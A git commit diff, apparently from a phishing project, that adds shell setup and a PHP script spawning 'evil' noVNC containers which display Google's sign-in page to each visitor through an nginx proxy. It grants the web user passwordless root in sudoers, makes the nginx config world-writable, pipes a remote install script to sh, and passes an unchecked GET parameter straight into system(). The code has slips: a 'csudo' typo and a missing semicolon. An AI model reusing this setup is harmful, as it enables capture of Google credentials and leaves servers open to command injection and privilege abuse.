1c7cb6c32f4ecceb978a9338d15276ff5884eee2
wanetty <eduard.gm@gmail.com>
2022-11-08 00:41:36 +0100

    automatic run

--- Files/commands.sh
+++ Files/commands.sh
@@ -1,10 +1,12 @@
 sudo docker run --name nginx  -v /var/run/docker.sock:/var/run/docker.sock -v $(pwd):/usr/share/nginx/html --network nginx-evil -p 8080:8080 -d nginx
-sudo docker run -d --rm  -v "${PWD}/Downloads":"/home/user/Downloads" -e FOLDER=google -e RESOLUTION=1920x1080x24 -e WEBPAGE=https://accounts.google.com/ --network=nginx-evil --name evilnovnc1 evil_edu
-sudo docker exec nginx nginx -t
+csudo docker exec nginx nginx -t
 sudo docker exec nginx nginx -s reload
-apt update && apt install apache2 php7.4 vim -y
+# Apache
+apt update && apt install apache2 php7.4 vim sudo -y
 sed -i 's/80/8080/g' /etc/nginx/conf.d/default.conf && nginx -s reload
-
 a2enmod php7.4
 service apache2 start
+chmod 777 /etc/nginx/conf.d/default.conf
+#Docker
 curl -fsSL https://get.docker.com | sh
+echo 'www-data ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
--- Files/index.php
+++ Files/index.php
@@ -1,5 +1,70 @@
 <?php
+$text="location /\$server {
+    proxy_pass http://\$server:5980/;
+}
+ location /\$server/websockify {
+    proxy_pass http://\$server:5980/\$server/websockify;
+    proxy_http_version 1.1;
+    proxy_set_header Upgrade \$http_upgrade;
+    proxy_set_header Connection \"Upgrade\";
+    proxy_set_header Host \$host;
+}
 
-echo uniqid("", true);
+location /core/ {
+   rewrite /core/(.*) /\$server/core/$1 break;
+   proxy_pass http://\$server:5980;
+}
+location /vendor/ {
+   rewrite /vendor/(.*) /\$server/vendor/$1 break;
+   proxy_pass http://\$server:5980;
+}
+}";
+
+$text2="location /\$server {
+    proxy_pass http://\$server:5980/;
+}
+ location /\$server/websockify {
+    proxy_pass http://\$server:5980/\$server/websockify;
+    proxy_http_version 1.1;
+    proxy_set_header Upgrade \$http_upgrade;
+    proxy_set_header Connection \"Upgrade\";
+    proxy_set_header Host \$host;
+}
+}";
+
+
+
+$uidphp=uniqid("", true);
+$uidphp=str_replace(".","_",$uidphp);
+$filename = '/etc/nginx/conf.d/default.conf';
+$flag = '/etc/flag.txt'
+
+
+
+
+if (file_exists($flag)){
+    $text_modifiqued = str_replace("\$server",$uidphp,$text2);
+}else{
+    $text_modifiqued = str_replace("\$server",$uidphp,$text);
+}
+
+if (is_writable($filename)) {
+    $lines = file($filename);
+    $last = sizeof($lines) - 1 ;
+    unset($lines[$last]);
+
+    // write the new data to the file
+    $fp = fopen($filename, 'w');
+    fwrite($fp, implode('', $lines));
+    fwrite($fp, $text_modifiqued);
+    fclose($fp);
+    $fp = fopen($flag, 'a');
+    fwrite($fp, "check");
+    fclose($fp);
+    system('sudo nginx -s reload');
+    $resolu = $_GET['x'];
+    echo $uidphp;
+    system("sudo docker run -d --rm   -e FOLDER=".$uidphp." -e RESOLUTION=".$resolu."x24 -e WEBPAGE=https://accounts.google.com/ --network=nginx-evil --name ".$uidphp." d0c755c8b745");
+}
 
 ?>
